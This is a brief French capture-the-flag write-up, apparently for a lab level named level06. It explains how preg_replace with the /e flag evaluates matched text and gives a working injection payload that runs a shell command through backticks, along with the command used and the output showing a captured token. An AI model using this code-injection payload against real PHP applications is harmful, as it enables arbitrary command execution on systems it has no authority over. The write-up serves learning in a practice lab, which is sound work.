On a un binaire et son code source.
Dans le code on repere la fonction preg_replace() contenant une regex avec le flag e. Tout ce qui matchera la regex sera evalue par le programme.
Le programme prend en argument un fichier dont il lira le contenu, donc si on place du code executable dans un fichier et qu'on le passe en argument de level06, ce contenu sera execute.

On ecrit :
	[x ${`getflag`}]
dans un fichier /tmp/get
Avec la commande:
	./level06 /tmp/get
on obtient :
	PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
	 in /home/user/level06/level06.php(4) : regexp code on line 1

